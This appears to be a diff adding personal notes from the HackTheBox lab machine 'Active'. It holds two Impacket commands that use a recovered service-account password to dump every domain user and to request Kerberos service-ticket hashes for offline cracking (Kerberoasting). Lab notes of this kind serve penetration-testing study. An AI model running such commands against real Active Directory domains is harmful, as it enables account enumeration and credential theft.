@@ -1,0 +1,4 @@
+# impacket scripts to dump all domain users:
+ ./GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+# to obtain a SPN values and hashes of the exposed user accounts: (which have SPN enabbled)
+ GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
